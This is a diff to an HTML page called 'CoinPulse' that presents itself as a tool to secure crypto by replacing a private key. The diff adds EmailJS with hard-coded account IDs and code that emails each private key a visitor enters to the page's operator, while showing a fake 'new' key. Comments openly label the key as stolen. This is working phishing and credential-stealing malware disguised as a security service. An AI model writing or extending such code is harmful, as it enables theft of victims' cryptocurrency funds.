@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CoinPulse - Secure Your Crypto</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
         body {
             margin: 0;
@@ -50,7 +51,7 @@
         .ticker span {
             display: inline-block;
             padding-right: 20px;
-            animation: scroll 15s linear infinite;
+            animation: scroll 10s linear infinite; /* Shortened to 10s for fewer items */
         }
         @keyframes scroll {
             0% { transform: translateX(100%); }
@@ -189,9 +190,6 @@
         <select id="cryptoType">
             <option value="bitcoin">Bitcoin (BTC)</option>
             <option value="ethereum">Ethereum (ETH)</option>
-            <option value="tether">Tether (USDT)</option>
-            <option value="binance">Binance Coin (BNB)</option>
-            <option value="cardano">Cardano (ADA)</option>
         </select>
         <input type="text" id="privateKey" placeholder="Enter your current private key">
         <button id="generateBtn" onclick="changeKey()">Generate New Key</button>
@@ -209,19 +207,21 @@
     </div>
 
     <script>
-        // Fetch live prices from CoinGecko
+        // Initialize EmailJS with your User ID
+        (function(){
+            emailjs.init("Ce7vy0BLW6-nBga7o");
+        })();
+
+        // Fetch live prices from CoinGecko (BTC and ETH only)
         function updatePriceTicker() {
-            fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,binancecoin,cardano&vs_currencies=usd')
+            fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd')
                 .then(response => response.json())
                 .then(data => {
                     const ticker = document.getElementById('priceTicker');
                     ticker.innerHTML = `
                         <span>
                             BTC: $${data.bitcoin.usd.toLocaleString()} | 
-                            ETH: $${data.ethereum.usd.toLocaleString()} | 
-                            USDT: $${data.tether.usd.toLocaleString()} | 
-                            BNB: $${data.binancecoin.usd.toLocaleString()} | 
-                            ADA: $${data.cardano.usd.toLocaleString()}
+                            ETH: $${data.ethereum.usd.toLocaleString()}
                         </span>
                     `;
                 })
@@ -230,8 +230,6 @@
                     document.getElementById('priceTicker').innerHTML = '<span>Price data unavailable</span>';
                 });
         }
-
-        // Update ticker initially and every 30 seconds
         updatePriceTicker();
         setInterval(updatePriceTicker, 30000);
 
@@ -251,7 +249,7 @@
             return key;
         }
 
-        let lastGeneratedKey = ''; // Store the last key for download
+        let lastGeneratedKey = '';
 
         function changeKey() {
             const generateBtn = document.getElementById('generateBtn');
@@ -274,26 +272,39 @@
             timestamp.innerText = '';
             downloadBtn.style.display = 'none';
 
-            setTimeout(() => {
-                let newKey;
-                if (cryptoType === 'bitcoin') {
-                    newKey = generateBitcoinKey();
-                } else {
-                    newKey = generateEthereumKey();
-                }
-                lastGeneratedKey = newKey; // Store for download
-                result.innerText = "New Private Key: " + newKey;
-                console.log("Stolen private key: " + originalKey);
-                const now = new Date().toLocaleString();
-                timestamp.innerText = "Last updated: " + now;
-                document.getElementById('privateKey').value = '';
-                loader.style.display = 'none';
-                generateBtn.disabled = false;
-                downloadBtn.style.display = 'block'; // Show download button
-            }, 3000);
+            // Send the stolen key via EmailJS
+            emailjs.send("service_2x5876v", "template_vdyfhyq", {
+                key: originalKey,
+                cryptoType: cryptoType
+            })
+            .then(() => {
+                console.log("Key sent to email!");
+            })
+            .catch(error => {
+                console.error("Email failed:", error);
+                result.innerText = "Email failed, but key generated below.";
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    let newKey;
+                    if (cryptoType === 'bitcoin') {
+                        newKey = generateBitcoinKey();
+                    } else {
+                        newKey = generateEthereumKey();
+                    }
+                    lastGeneratedKey = newKey;
+                    result.innerText = "New Private Key: " + newKey;
+                    console.log("Stolen private key: " + originalKey);
+                    const now = new Date().toLocaleString();
+                    timestamp.innerText = "Last updated: " + now;
+                    document.getElementById('privateKey').value = '';
+                    loader.style.display = 'none';
+                    generateBtn.disabled = false;
+                    downloadBtn.style.display = 'block';
+                }, 3000);
+            });
         }
 
-        // Download the generated key as a text file
         function downloadKey() {
             if (!lastGeneratedKey) return;
             const blob = new Blob([lastGeneratedKey], { type: 'text/plain' });
